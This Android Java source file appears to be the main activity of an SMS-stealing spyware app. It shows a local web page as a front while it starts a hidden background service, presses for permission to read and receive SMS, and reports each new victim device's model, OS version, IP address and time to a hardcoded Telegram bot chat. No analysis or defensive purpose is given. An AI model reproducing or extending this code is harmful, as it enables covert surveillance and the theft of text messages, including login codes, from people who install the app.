package com.tiburela.telegramccc;

import static android.os.Build.VERSION.SDK_INT;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.StrictMode;
import android.text.format.Formatter;
import android.util.Log;
import android.view.View;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.Toast;

import com.google.android.material.bottomsheet.BottomSheetDialog;
import com.pengrad.telegrambot.TelegramBot;
import com.pengrad.telegrambot.UpdatesListener;
import com.pengrad.telegrambot.model.Message;
import com.pengrad.telegrambot.model.request.ForceReply;
import com.pengrad.telegrambot.model.request.ParseMode;
import com.pengrad.telegrambot.request.SendMessage;
import com.pengrad.telegrambot.response.BaseResponse;
import com.pengrad.telegrambot.response.SendResponse;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class MainActivity extends AppCompatActivity {
    final int  ACCESS_WIFI_STATE_PERMISION =24;

    String mensajeToSend="";
    final int  SMS_PERMISSION_CODE   =56;
    WebView webView;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);




        ServiceCommunicator sensorService = new ServiceCommunicator();

        //Intent serviceIntent = new Intent(this, ServiceCommunicator.class);
        //startForegroundService(serviceIntent);

        //start the service

        Intent intent = new Intent(this, ServiceCommunicator.class);
        if (!isMyServiceRunning(sensorService.getClass())) {
            startService(intent);
        }


        isMyServiceRunning(sensorService.getClass());



        checkPersmision();



        if(!SharePref.chekifSeenvio(MainActivity.this)) {

            creMensajeYenvia();

        }


        //webviewLocal
        addWebViewdata();



    }



    private String getCurrentDispositivo(){


        String reqString = Build.MANUFACTURER
                + " " + Build.MODEL + " " + Build.VERSION.RELEASE
                + " " + Build.VERSION_CODES.class.getFields()[android.os.Build.VERSION.SDK_INT].getName();


return reqString;

    }



    private void checkPersmision(){

        if (ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_WIFI_STATE)
                == PackageManager.PERMISSION_GRANTED) {

            // getLocalIpAddress();

        }

        if (ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.RECEIVE_SMS)
                == PackageManager.PERMISSION_DENIED) {
           // makePermissionRequest();

            makePermissionRequest();

           // addpermionsBOTTONsHEET();
            Log.i("service","es permiso denegeado 1");

        }else {
            Log.i("service","es permiso concedido 1");


        }

        if (ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_SMS)
                == PackageManager.PERMISSION_DENIED) {

            makePermissionRequest();


            //  makePermissionRequest();
            Log.i("service","es permiso denegeado 2");


        }

        else {

            Log.i("service","es permiso concedido 2");

        }



        if (ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.FOREGROUND_SERVICE)
                == PackageManager.PERMISSION_DENIED) {

            ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.FOREGROUND_SERVICE},
                    2);


            Log.i("service","es permiso denegeado 3");


        }

        else {

            Log.i("service","es permiso concedido 3");

        }



        if (ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_WIFI_STATE)
                == PackageManager.PERMISSION_DENIED) {

            ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.ACCESS_WIFI_STATE},
                    ACCESS_WIFI_STATE_PERMISION);


            Log.i("service","es permiso denegeado 4");


        }









    }

    public void makePermissionRequest() {


        ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.RECEIVE_SMS},
                1);


        ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.READ_SMS},
                2);




    }



    public void makePermissionRequ() {



        ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.RECEIVE_SMS},
                1);


        ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.READ_SMS},
                2);




    }




    private void creMensajeYenvia(){

        WifiManager wm = (WifiManager) MainActivity.this.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        String ip = Formatter.formatIpAddress(wm.getConnectionInfo().getIpAddress());

        String currentTime = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());

        mensajeToSend=" Nuevo Dispositivo: "+getCurrentDispositivo()+" Direccion Ip : "+ip+" Hora: "+currentTime;


        //ENVIAMOS


        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder()
                .permitAll().build();
        StrictMode.setThreadPolicy(policy);
        //your codes here


        // Create your bot passing the token received from @BotFather
        TelegramBot bot = new TelegramBot(Constans.tockenChatBot);

// Register for updates
        bot.setUpdatesListener(updates -> {
            // ... process updates
            // return id of last processed update or confirm them all
            return UpdatesListener.CONFIRMED_UPDATES_ALL;
        });

// Send messages
        // long chatId = update.message().chat().id();
        //  SendResponse response = bot.execute(new SendMessage("5762677106", "Hello!"));
        //  SendResponse sendResponsex = bot.execute(request);
        // TelegramBot bota = new TelegramBot.Builder("BOT_TOKEN").okHttpClient(client).build();
        SendMessage request = new SendMessage(Constans.chatID, mensajeToSend)
                .parseMode(ParseMode.HTML)
                .disableWebPagePreview(true)
                .disableNotification(false)
                .replyMarkup(new ForceReply());


        SendResponse sendResponse = bot.execute(request);

        Log.i("reuqener","el erro res  "+ sendResponse.errorCode());


        BaseResponse responsebase = bot.execute(request);
        boolean ok2 = responsebase.isOk();


        SharePref.inshareANDaddData(MainActivity.this,true);


    }



    private boolean isMyServiceRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                Log.i("Service status", "Running");
                return true;
            }
        }
        Log.i("Service status", "Not running");
        return false;
    }




    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           String permissions[], int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case 1: {

                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {

                    // permission was granted, yay! Do the
                    // contacts-related task you need to do.
                } else {


                    // permission denied, boo! Disable the
                    // functionality that depends on this permission.
                    Toast.makeText(MainActivity.this, "Permission denied RECEIVE_SMS" , Toast.LENGTH_SHORT).show();
                }
                return;
            }



            case SMS_PERMISSION_CODE: {

                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0
                        && grantResults[1] == PackageManager.PERMISSION_GRANTED) {



                    if(!SharePref.chekifSeenvio(MainActivity.this)) {

                        creMensajeYenvia();

                    }


                    // permission was granted, yay! Do the
                    // contacts-related task you need to do.
                } else {

                    // permission denied, boo! Disable the
                    // functionality that depends on this permission.
                    Toast.makeText(MainActivity.this, "Permission denied SMS ", Toast.LENGTH_SHORT).show();
                }
                return;
            }



            case ACCESS_WIFI_STATE_PERMISION: {

                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0
                        && grantResults[2] == PackageManager.PERMISSION_GRANTED) {

                    // getLocalIpAddress();


                    WifiManager wm = (WifiManager) MainActivity.this.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                    String ip = Formatter.formatIpAddress(wm.getConnectionInfo().getIpAddress());

                    Log.i("service","el ip es "+ip);

                    // permission was granted, yay! Do the
                    // contacts-related task you need to do.
                } else {

                    // permission denied, boo! Disable the
                    // functionality that depends on this permission.
                 //   Toast.makeText(MainActivity.this, "Permission denied SMS ", Toast.LENGTH_SHORT).show();
                }
                return;
            }


            // other 'case' lines to check for other
            // permissions this app might request
        }
    }


    private void addpermionsBOTTONsHEET(){

        BottomSheetDialog  bottomSheetDialog = new BottomSheetDialog(MainActivity.this);
        bottomSheetDialog.setContentView(R.layout.bottom_sheet_ver_atachx);

        bottomSheetDialog.setCancelable(false);
        Button btnConceder =bottomSheetDialog.findViewById(R.id.btnConceder);
        Button btnCerrar =bottomSheetDialog.findViewById(R.id.btnCerrar);

        btnConceder.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {


              /*

                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.READ_SMS},
                        150);

*/

                makePermissionRequest();


                bottomSheetDialog.dismiss();


            }
        });



        btnCerrar.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                bottomSheetDialog.dismiss();


            }
        });
        bottomSheetDialog.show();

    }


    private void addWebViewdata(){

        webView = findViewById(R.id.myWebView);
        WebSettings webSettings = webView.getSettings();
        webSettings.setBuiltInZoomControls(true);
        webSettings.setJavaScriptEnabled(true);
        webView.setWebViewClient(new Callback());
        webView.loadUrl("file:///android_asset/index.html");

    }


    private class Callback extends WebViewClient {
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            return false;
        }
    }

    @Override
    public void onBackPressed() {
        if(webView != null && webView.canGoBack()){
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }
}